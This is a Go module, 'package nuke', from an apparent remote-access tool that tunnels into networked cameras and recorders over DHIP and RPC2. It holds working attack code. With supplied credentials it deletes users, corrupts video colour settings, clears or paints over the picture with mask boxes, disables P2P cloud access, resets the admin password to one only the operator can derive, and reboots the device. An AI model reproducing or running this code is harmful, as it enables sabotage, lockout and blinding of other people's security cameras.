package nuke

import (
	"fmt"
	"strings"
	"time"
	"ratkown/ratkown/dhip"
	"ratkown/ratkown/net"
	"ratkown/ratkown/types"
	"ratkown/ratkown/ui"
)

type NukeSession struct {
	Via    string
	Get    func(name string) ([]any, error)
	Set    func(name string, table any) error
	SetSec func(name string, table any) error
	Call   func(method string, params map[string]any) (map[string]any, error)
	Closer func()
}

func NewNukeSession(tunnel *net.PTCPTunnel, login, pass string) (*NukeSession, error) {
	var dhipErr error
	if s, err := newNukeDHIP(tunnel, login, pass); err == nil {
		return s, nil
	} else {
		dhipErr = err
	}
	s, rpcErr := newNukeRPC2(tunnel, login, pass)
	if rpcErr != nil {
		return nil, fmt.Errorf("dhip 5000: %v rpc 80: %v", dhipErr, rpcErr)
	}
	return s, nil
}

func newNukeDHIP(tunnel *net.PTCPTunnel, login, pass string) (*NukeSession, error) {
	dh, err := tunnel.NewDHIPClientOnPort(5000)
	if err != nil {
		return nil, err
	}
	if err := dh.LoginNormal(login, pass); err != nil {
		dh.Close()
		return nil, err
	}
	id := 100
	return &NukeSession{
		Via: "dhip",
		Get: func(name string) ([]any, error) {
			return dhip.DHIPGetTable(dh, name, id)
		},
		Set: func(name string, table any) error {
			return dhipSetConfig(dh, name, table, id)
		},
		Call: func(method string, params map[string]any) (map[string]any, error) {
			return dh.Call(method, params, id, nil, nil)
		},
		Closer: func() { dh.Close() },
	}, nil
}

func newNukeRPC2(tunnel *net.PTCPTunnel, login, pass string) (*NukeSession, error) {
	osd, err := dhip.NewRPC2Session(tunnel, login, pass)
	if err != nil {
		return nil, err
	}
	id := 100
	return &NukeSession{
		Via: "rpc",
		Get: func(name string) ([]any, error) {
			return dhip.RPC2GetTable(osd.Conn, osd.Sess, osd.Cookie, name, id)
		},
		Set: func(name string, table any) error {
			return rpc2SetConfig(osd.Conn, osd.Sess, osd.Cookie, name, table, id)
		},
		SetSec: func(name string, table any) error {
			_, err := dhip.SecuritySetConfig(osd.Conn, osd.Sess, osd.Cookie, name, table)
			return err
		},
		Call: func(method string, params map[string]any) (map[string]any, error) {
			out, _, err := osd.Conn.Post("/RPC2", map[string]any{
				"method": method, "params": params, "id": id, "session": osd.Sess,
			}, osd.Cookie)
			return out, err
		},
		Closer: osd.Close,
	}, nil
}

func dhipSetConfig(dh *net.DHIPClient, name string, table any, id int) error {
	r, err := dh.Call("configManager.setConfig", map[string]any{
		"name": name, "table": table, "options": []any{},
	}, id, nil, nil)
	if err != nil {
		return err
	}
	if ok, _ := r["result"].(bool); !ok {
		return fmt.Errorf("setConfig %s rejected: %v", name, r["error"])
	}
	return nil
}

func rpc2SetConfig(conn *dhip.ConnSession, sess any, cookie, name string, table any, id int) error {
	r, _, err := conn.Post("/RPC2", map[string]any{
		"method": "configManager.setConfig",
		"params": map[string]any{"name": name, "table": table, "options": []any{}},
		"id":     id, "session": sess,
	}, cookie)
	if err != nil {
		return err
	}
	if ok, _ := r["result"].(bool); !ok {
		return fmt.Errorf("setConfig %s rejected: %v", name, r["error"])
	}
	return nil
}

func nukeKeepUser(name, dummy string) bool {
	if name == "" || name == "admin" {
		return true
	}
	if dummy != "" && name == dummy {
		return true
	}
	return strings.EqualFold(name, "Admin")
}

func nukeDeleteUsers(s *NukeSession, dummy string) (int, error) {
	r, err := s.Call("userManager.getUserInfoAll", nil)
	if err != nil {
		return 0, err
	}
	if ok, _ := r["result"].(bool); !ok {
		return 0, fmt.Errorf("getUserInfoAll rejected: %v", r["error"])
	}
	users, _ := r["params"].(map[string]any)
	list, _ := users["users"].([]any)
	removed := 0
	for _, raw := range list {
		u, ok := raw.(map[string]any)
		if !ok {
			continue
		}
		name, _ := u["Name"].(string)
		if reserved, _ := u["Reserved"].(bool); reserved {
			continue
		}
		if nukeKeepUser(name, dummy) {
			continue
		}
		if _, err := s.Call("userManager.deleteUser", map[string]any{"name": name}); err != nil {
			return removed, err
		}
		removed++
	}
	return removed, nil
}

func nukeColorSections(level int) []any {
	sections := make([]any, 0, 3)
	sections = append(sections, map[string]any{
		"Brightness": level, "ChromaSuppress": 50, "Contrast": level,
		"Gamma": level, "Hue": 50, "Saturation": level,
		"Style": "Standard", "TimeSection": "1 00:00:00-24:00:00",
	})
	for i := 0; i < 2; i++ {
		sections = append(sections, map[string]any{
			"Brightness": level, "ChromaSuppress": 50, "Contrast": level,
			"Gamma": level, "Hue": 50, "Saturation": level,
			"Style": "Standard", "TimeSection": "0 00:00:00-24:00:00",
		})
	}
	return sections
}

func nukeSharpSections(level int) []any {
	sharp := make([]any, 0, 3)
	for i := 0; i < 3; i++ {
		sharp = append(sharp, map[string]any{"Level": 50, "Mode": 1, "Sharpness": level})
	}
	return sharp
}

func nukeChannelTable(channels int, mk func() []any) []any {
	pad := 32
	if channels > pad {
		pad = channels
	}
	table := make([]any, 0, pad)
	for ch := 0; ch < pad; ch++ {
		if ch < channels {
			table = append(table, mk())
		} else {
			table = append(table, nil)
		}
	}
	return table
}

func nukeVideoSet(s *NukeSession, channels, level int) error {
	if channels < 1 {
		channels = 1
	}
	mkColor := func() []any { return nukeColorSections(level) }
	mkSharp := func() []any { return nukeSharpSections(level) }
	if channels == 1 {
		if err := s.Set("VideoColor", []any{mkColor()}); err != nil {
			return err
		}
		return s.Set("VideoInSharpness", []any{mkSharp()})
	}
	if err := s.Set("VideoColor", nukeChannelTable(channels, mkColor)); err != nil {
		return err
	}
	return s.Set("VideoInSharpness", nukeChannelTable(channels, mkSharp))
}

func GenFortPass(serial string) string {
	h := uint64(2166136261)
	seed := serial + "ratk0wn-skver303"
	for _, r := range seed {
		h = (h ^ uint64(r)) * 16777619
	}
	const alphabet = "abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789"
	out := make([]byte, 12)
	for i := range out {
		h = h*6364136223846793005 + 1442695040888963407
		out[i] = alphabet[(h>>33)%uint64(len(alphabet))]
	}
	return string(out)
}

func FortifyAdmin(s *NukeSession, serial string) (string, error) {
	newPass := GenFortPass(serial)
	_, err := s.Call("userManager.modifyUser", map[string]any{
		"name":     "admin",
		"password": newPass,
	})
	if err != nil {
		return "", err
	}
	return newPass, nil
}

func AntiWhiteSweep(s *NukeSession) string {
	note := ""
	table, err := s.Get("VideoWidget")
	if err == nil {
		bad := false
		inspect := func(raw any) {
			m, ok := raw.(map[string]any)
			if !ok {
				return
			}
			covers, _ := m["Covers"].([]any)
			for _, c := range covers {
				cm, ok := c.(map[string]any)
				if !ok {
					continue
				}
				front, _ := cm["FrontColor"].([]any)
				if len(front) < 3 {
					continue
				}
				rgb := 0
				for _, v := range front[:3] {
					switch n := v.(type) {
					case float64:
						if int(n) >= 200 {
							rgb++
						}
					case int:
						if n >= 200 {
							rgb++
						}
					}
				}
				rect, _ := cm["Rect"].([]any)
				area := 1.0
				if len(rect) == 4 {
					getv := func(i int) float64 {
						switch n := rect[i].(type) {
						case float64:
							return n
						case int:
							return float64(n)
						}
						return 0
					}
					w := getv(2) - getv(0)
					hh := getv(3) - getv(1)
					if w > 0 && hh > 0 {
						area = (w * hh) / (8192 * 8192)
					}
				}
				if rgb == 3 && area > 0.25 {
					bad = true
				}
			}
		}
		for _, raw := range table {
			if nested, ok := raw.([]any); ok {
				for _, item := range nested {
					inspect(item)
				}
				continue
			}
			inspect(raw)
		}
		if bad {
			if err := nukeUnmask(s, []int{0, 0, 0, 255}, []int{0, 0, 0, 0}); err == nil {
				note += "covers stripped"
			} else {
				note += "covers strip failed"
			}
		}
	}
	if err := nukeVideoRestore(s); err == nil {
		note += " · colors ok"
	} else {
		note += " · colors: " + err.Error()
	}
	return note
}

func nukeVideoRestore(s *NukeSession) error {
	table, err := s.Get("VideoColor")
	if err != nil {
		return err
	}
	fixed := 0
	fix := func(v any) {
		m, ok := v.(map[string]any)
		if !ok {
			return
		}
		for _, k := range []string{"Brightness", "Contrast", "Gamma"} {
			var fval float64
			switch val := m[k].(type) {
			case float64:
				fval = val
			case int:
				fval = float64(val)
			default:
				continue
			}
			if fval < 30 || fval > 70 {
				m[k] = 50
				fixed++
			}
		}
	}
	patched := 0
	for _, raw := range table {
		if nested, ok := raw.([]any); ok {
			for _, item := range nested {
				fix(item)
				patched++
			}
			continue
		}
		fix(raw)
		patched++
	}
	if patched == 0 {
		return fmt.Errorf("VideoColor table shape unknown")
	}
	if fixed == 0 {
		return nil
	}
	return setWithSec(s, "VideoColor", table)
}

func setWithSec(s *NukeSession, name string, table any) error {
	if err := s.Set(name, table); err != nil {
		if s.SetSec != nil {
			return s.SetSec(name, table)
		}
		return err
	}
	return nil
}

func nukeUnmask(s *NukeSession, front, back []int) error {
	table, err := s.Get("VideoWidget")
	if err != nil {
		return err
	}
	patched := 0
	applyEmpty := func(raw any) {
		if m, ok := raw.(map[string]any); ok {
			m["Covers"] = []any{}
			patched++
		}
	}
	for _, raw := range table {
		if nested, ok := raw.([]any); ok {
			for _, item := range nested {
				applyEmpty(item)
			}
			continue
		}
		applyEmpty(raw)
	}
	if patched == 0 {
		return fmt.Errorf("VideoWidget table shape unknown")
	}
	if err := setWithSec(s, "VideoWidget", table); err != nil {
		return nukeBox(s, 1, [][4]int{{0, 0, 1, 1}}, front, back)
	}

	check, err := s.Get("VideoWidget")
	if err != nil {
		return nil
	}
	left := 0
	count := func(raw any) {
		if m, ok := raw.(map[string]any); ok {
			if covs, ok := m["Covers"].([]any); ok {
				left += len(covs)
			}
		}
	}
	for _, raw := range check {
		if nested, ok := raw.([]any); ok {
			for _, item := range nested {
				count(item)
			}
			continue
		}
		count(raw)
	}
	if left > 0 {
		if err := nukeBox(s, 1, [][4]int{{0, 0, 1, 1}}, front, back); err != nil {
			return fmt.Errorf("covers survived: %d rects, stub rejected", left)
		}
	}
	return nil
}

func nukeCovers(rects [][4]int, front, back []int) []any {
	covers := make([]any, 0, len(rects))
	for _, r := range rects {
		covers = append(covers, map[string]any{
			"BackColor":    back,
			"FrontColor":   front,
			"EncodeBlend":  true,
			"PreviewBlend": false,
			"Rect":         []int{r[0], r[1], r[2], r[3]},
		})
	}
	return covers
}

func nukeBox(s *NukeSession, channels int, rects [][4]int, front, back []int) error {
	if len(rects) == 0 {
		rects = [][4]int{{0, 0, 1, 1}}
	}
	table, err := s.Get("VideoWidget")
	if err != nil {
		return err
	}
	covers := nukeCovers(rects, front, back)
	patched := 0
	apply := func(raw any) {
		m, ok := raw.(map[string]any)
		if !ok {
			return
		}
		m["Covers"] = covers
		patched++
	}
	for _, raw := range table {
		if nested, ok := raw.([]any); ok {
			for _, item := range nested {
				apply(item)
			}
			continue
		}
		apply(raw)
	}
	if patched == 0 {
		return fmt.Errorf("VideoWidget table shape unknown")
	}
	if err := setWithSec(s, "VideoWidget", table); err != nil {
		return err
	}
	return nil
}

func flipP2PFields(raw any, fields []string) int {
	patched := 0
	flip := func(item any) {
		m, ok := item.(map[string]any)
		if !ok {
			return
		}
		for _, f := range fields {
			if _, has := m[f]; has {
				m[f] = false
				patched++
			}
		}
	}
	if nested, ok := raw.([]any); ok {
		for _, item := range nested {
			flip(item)
		}
		return patched
	}
	flip(raw)
	return patched
}

func checkP2POff(raw any, fields []string) bool {
	items := []any{raw}
	if nested, ok := raw.([]any); ok {
		items = nested
	}
	for _, item := range items {
		m, ok := item.(map[string]any)
		if !ok {
			continue
		}
		for _, f := range fields {
			if v, has := m[f]; has && v != false {
				return false
			}
		}
	}
	return true
}

type p2pTableSpec struct {
	name   string
	fields []string
}

func shortErr(err error, n int) string {
	if err == nil {
		return ""
	}
	s := err.Error()
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\r", " ")
	if len(s) > n {
		return s[:n]
	}
	return s
}

func disableTable(ss *NukeSession, spec p2pTableSpec) (ok, retry bool, note string) {
	table, err := ss.Get(spec.name)
	if err != nil {
		return false, false, spec.name + " unreadable"
	}
	patched := 0
	for _, raw := range table {
		patched += flipP2PFields(raw, spec.fields)
	}
	if patched == 0 {
		return false, false, spec.name + " has no switch fields"
	}
	if err := ss.Set(spec.name, table); err != nil {
		if ss.SetSec != nil {
			if serr := ss.SetSec(spec.name, table); serr == nil {
				if ok, retry, note := verifyTable(ss, spec); ok {
					return true, retry, note + " encrypted"
				} else {
					return false, retry, note
				}
			} else {
				return false, true, spec.name + " rejected plain (" + shortErr(err, 80) + ") and encrypted (" + shortErr(serr, 80) + ")"
			}
		}
		return false, true, spec.name + " rejected (" + shortErr(err, 80) + ")"
	}
	return verifyTable(ss, spec)
}

func verifyTable(ss *NukeSession, spec p2pTableSpec) (bool, bool, string) {
	check, err := ss.Get(spec.name)
	if err != nil {
		if check, err = ss.Get(spec.name); err != nil {
			return false, true, spec.name + " verify unreadable"
		}
	}
	for _, raw := range check {
		if !checkP2POff(raw, spec.fields) {
			return false, false, spec.name + " refused"
		}
	}
	return true, false, spec.name + " off via " + ss.Via
}

func nukeDisableP2P(tunnel *net.PTCPTunnel, login, pass, serial string) (string, error) {
	s, err := NewNukeSession(tunnel, login, pass)
	if err != nil {
		return "", err
	}
	defer s.Closer()
	tables := []p2pTableSpec{
		{"VSP_PaaS", []string{"Enable", "Online"}},
		{"T2UServer", []string{"Enable"}},
	}
	var tried []string
	note := ""
	for _, spec := range tables {
		if ok, retry, n := disableTable(s, spec); ok {
			note = n
			break
		} else {
			tried = append(tried, n)
			if !retry {
				continue
			}
		}
		var alt *NukeSession
		var aerr error
		if s.Via == "rpc" {
			alt, aerr = newNukeDHIP(tunnel, login, pass)
		} else {
			alt, aerr = newNukeRPC2(tunnel, login, pass)
		}
		if aerr != nil {
			tried = append(tried, "alt transport unavailable ("+shortErr(aerr, 80)+")")
			continue
		}
		if ok, _, n := disableTable(alt, spec); ok {
			alt.Closer()
			note = n + " via alt"
			break
		} else {
			tried = append(tried, n+" (alt)")
		}
		alt.Closer()
	}
	if note == "" {
		return "", fmt.Errorf("no p2p switch table (%s)", strings.Join(tried, ", "))
	}
	time.Sleep(5 * time.Second)
	if probeP2PAlive(serial) {
		return "", fmt.Errorf("%s but P2P tunnel still alive (reboot needed)", note)
	}
	return note + ", tunnel dead", nil
}

func probeP2PAlive(serial string) bool {
	for i := 0; i < 2; i++ {
		c := net.NewDHClient(serial)
		c.SetRetries(1)
		c.SetTimeout(10 * time.Second)
		err := c.Handshake()
		c.Close()
		if err == nil {
			return true
		}
	}
	return false
}

func RunNuke(tunnel *net.PTCPTunnel, login, pass string, channels int, cfg types.NukeConfig, dummy string, serial string, armed bool) {
	if !armed || !cfg.Enabled() {
		return
	}
	if until := net.DeviceLockedUntil(serial); !until.IsZero() {
		ui.LogNukeResult(serial, "locked", false, fmt.Errorf("account locked until %s", until.Format("15:04:05")))
		return
	}
	s, err := NewNukeSession(tunnel, login, pass)
	if err != nil {
		ui.LogNukeResult(serial, "session", false, err)
		return
	}
	defer s.Closer()

	if cfg.Delete {
		n, err := nukeDeleteUsers(s, dummy)
		if err != nil {
			ui.LogNukeResult(serial, "delete", false, err)
		} else {
			ui.LogNukeResult(serial, fmt.Sprintf("delete removed %d users", n), true, nil)
		}
	}
	if level := cfg.VideoLevel(); level > 0 {
		if err := nukeVideoSet(s, channels, level); err != nil {
			ui.LogNukeResult(serial, "video", false, err)
		} else {
			ui.LogNukeResult(serial, fmt.Sprintf("video set to %d", level), true, nil)
		}
	}
	if cfg.Box {
		if len(cfg.BoxRects) == 0 {
			if err := nukeUnmask(s, cfg.MaskFront, cfg.MaskBack); err != nil {
				ui.LogNukeResult(serial, "unmask", false, err)
			} else {
				ui.LogNukeResult(serial, "unmask (covers cleared)", true, nil)
			}
		} else {
			if err := nukeBox(s, channels, cfg.BoxRects, cfg.MaskFront, cfg.MaskBack); err != nil {
				ui.LogNukeResult(serial, "box", false, err)
			} else {
				ui.LogNukeResult(serial, "box applied", true, nil)
			}
		}
	}

	if cfg.RestoreVideo {
		if err := nukeVideoRestore(s); err != nil {
			ui.LogNukeResult(serial, "video restore", false, err)
		} else {
			ui.LogNukeResult(serial, "video restored (50/50/50)", true, nil)
		}
	}
	if cfg.Disable {
		if note, err := nukeDisableP2P(tunnel, login, pass, serial); err != nil {
			ui.LogNukeResult(serial, "disable", false, err)
		} else {
			ui.LogNukeResult(serial, "disable "+note, true, nil)
		}
	}

	if cfg.Reboot {
		if _, err := s.Call("systemManager.reboot", nil); err != nil {
			ui.LogNukeResult(serial, "reboot request failed", false, err)
		} else {
			ui.LogNukeResult(serial, "reboot requested (encoder rebuilds)", true, nil)
		}
	}
}
